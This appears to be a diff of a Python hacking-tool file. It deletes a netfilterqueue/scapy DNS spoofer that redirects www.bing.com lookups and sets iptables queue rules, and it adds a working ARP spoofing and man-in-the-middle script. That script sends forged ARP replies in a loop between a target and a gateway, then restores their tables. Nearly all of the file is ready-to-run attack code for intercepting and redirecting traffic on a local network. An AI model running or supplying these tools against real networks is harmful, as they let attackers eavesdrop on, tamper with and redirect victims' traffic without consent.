@@ -1,112 +1,123 @@
-#!usr/bin/env python
+#!usr/bin/env python3
 
-#########################################################################
-# Author : Dhrumil Mistry
-#########################################################################
-
-
-#########################################################################
-# If you encounter Import error after installing netfilter use command 
-# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
-#########################################################################
+# how to forward port on linux
+# execute any of the commands below
+# 1. sudo sysctl -w net.ipv4.ip_forward=1
+# 2. sudo echo 1 > /proc/sys/net/ipv4/ip_forward
 
 
-from subprocess import call
-import netfilterqueue
-import scapy.all as scapy
+import scapy.all as sp
+import argparse
+from time import sleep
+
+def get_args():
+	parser = argparse.ArgumentParser('ARP spoofer')
+	parser.add_argument('-t', '--target', dest = 'target', help='target ip')
+	parser.add_argument('-s', '--spoof', dest = 'spoof', help='spoof ip')
+	parser.add_argument('-mitm', '--man-in-the-middle', dest = 'mitm', help='switch for mitm attack option, default is 0')
+
+	args = parser.parse_args()
+
+	target_ip = args.target
+	spoof_ip= args.spoof
+	mitm = args.mitm
+	del args
+	return target_ip, spoof_ip, mitm
 
 
-SPOOF_WEBSITE = b'www.bing.com'
-SPOOF_RDATA = b'10.0.2.15'
-
-############################### Functions ############################### 
-def forward_packets():
-    '''
-    configures the mitm for incoming request packets
-    into a queue.
-    '''
-
-    # executing the following command
-    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
-    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
-    # -I -> insert (packet into a chain specified by the user)
-    # -j -> jump if the packet matches the target.
-    # --queue-num -> jump to specfic queue number
-    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
-
-    # for local host
-    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
-    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
-    
+def check_args(target_ip, spoof_ip):
+    if not target_ip:
+        exit("[-] Please enter target ip as argument, use -h or --help for more info")
+    elif not spoof_ip:
+        exit("[-] Please enter spoof ip as argument, use -h or --help for more info")
+ 
+    return True
 
 
-def reset_config():
-    '''
-    resets the configurations changed while exectution of the program to 
-    its original configuration.
-    '''
-    call('sudo iptables --flush', shell=True)
+def generate_packet(PDST, HWDST, PSRC):
+	packet = sp.ARP(op=2, pdst=PDST, hwdst = HWDST, psrc = PSRC)
+	return packet
 
 
+def get_mac(ip):
+	arp_req = sp.ARP(pdst=ip)
+	brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
 
-def process_packet(packet):
-    '''
-    process received packet, everytime a packet is received.
-    prints the packet received in the queue and it changes 
-    the DNS response dest ip with your desired ip.
-    '''
-    scapy_pkt = scapy.IP(packet.get_payload())
+	packet = brdcst / arp_req
+	responded_list = sp.srp(packet, timeout = 1, verbose = False)[0]
+	try: 
+		return responded_list[0][1].hwsrc
+	except IndexError:
+		print("[-] target is unreachable or it's offline")
+		print("[*] try ping or nmap to scan the target to check whether it's online")
+		exit()
 
-    # Check for DNS layer in DNS Request Record (DNSRR) or 
-    # DNS Question Record (DNSQR)
-    if scapy_pkt.haslayer(scapy.DNSRR):
-        qname = scapy_pkt[scapy.DNSQR].qname
-        if SPOOF_WEBSITE in qname:
-            print('[*] Spoofing target ...')
-            response = scapy.DNSRR(rrname=qname, rdata=SPOOF_RDATA)
-            scapy_pkt[scapy.DNS].an = response
-            scapy_pkt[scapy.DNS].ancount = 1
+def spoof(target_ip, spoof_ip, args_status):
+	if args_status:
+		target_mac = get_mac(target_ip)
+		PACKET = generate_packet(target_ip, target_mac, spoof_ip)
+		sp.send(PACKET, verbose = False)
+	else:
+		print('[-] Error while spoofing the target ' + target_ip)
 
-            # remove IP.len,IP.chksum,UDP.len,UDP.chksum to make
-            # sure that our packet looks untampered and scapy will
-            # calculate it again for us.
-            del scapy_pkt[scapy.IP].len
-            del scapy_pkt[scapy.IP].chksum
-            del scapy_pkt[scapy.UDP].len
-            del scapy_pkt[scapy.UDP].chksum
 
-            packet.set_payload(bytes(scapy_pkt))
-            print(packet)
+def mitm(target_ip, spoof_ip, args_status):
+	print('[+] Launching MITM ARP Attack....')
+	packets_sent = 0
+	is_attacking = True
+	while is_attacking:
+		try:
+			spoof(target_ip, spoof_ip, args_status)
+			spoof(spoof_ip, target_ip, args_status)
+			packets_sent += 2
+			print('\r[+] Packets sent: ' + str(packets_sent), end='')
+			sleep(2)
+		except KeyboardInterrupt:
+			print('\r\n[+] Stopping MITM attack and restoring default settings...')
 
-    packet.accept()
-    
+			is_attacking = False
 
-############################### Main ############################### 
 
-print('[*] configuring packet receiver...')
+def spoof_only(target_ip, spoof_ip, args_status):
+	print(f'[+] Spoofing {target_ip} as {spoof_ip}....')
+	
+	packets_sent = 0
+	is_spoofing = True
+	while is_spoofing:
+		try:
+			spoof(target_ip, spoof_ip, args_status)
+			print('\r[+] Packets sent: ' + str(packets_sent), end='')
+			packets_sent += 1
+			sleep(2)
+		except KeyboardInterrupt:
+			print('\r\n[+] Stopping and restoring default settings...')
 
-forward_packets()
-print('[*] packet receiver configured successfully.\n')
+			is_spoofing = False
 
-print('[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    # Bind queue with queue-number 0
-    queue.bind(0, process_packet)
-    queue.run()
 
-except OSError as e:
-    print('[-] Run script with root priviliges.')
-    print(e)
+def restore_default_table(dst_ip, src_ip):
+	try:
+		dst_mac = get_mac(dst_ip)
+		src_mac = get_mac(src_ip)
+		packet = sp.ARP(op = 2, pdst = dst_ip, hwdst = dst_mac, psrc = src_ip, hwsrc = src_mac)
+		sp.send(packet, verbose = False, count=4)
 
-except KeyboardInterrupt:
-    print('\r[-] Keyboard Interrupt detected!')
+	except Exception as e:
+		print('[-] Exception occurred while restoring MAC address')
+		raise(e)
 
-except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
 
-finally:
-    print('[*] Restoring previous configurations.. please be patient...')
-    reset_config()
+TARGET_IP, SPOOF_IP, MITM= get_args()
+ARGS_STATUS = check_args(TARGET_IP, SPOOF_IP)
 
-    print('[-] Program stopped.')
+if MITM == '1':
+	mitm(TARGET_IP, SPOOF_IP, ARGS_STATUS)
+else:
+	spoof_only(TARGET_IP, SPOOF_IP, ARGS_STATUS)
+
+
+print('[+] Restoring default table for target and gateway....')
+restore_default_table(TARGET_IP, SPOOF_IP)
+restore_default_table(SPOOF_IP, TARGET_IP)
+
+print('[+] Closing Program...')
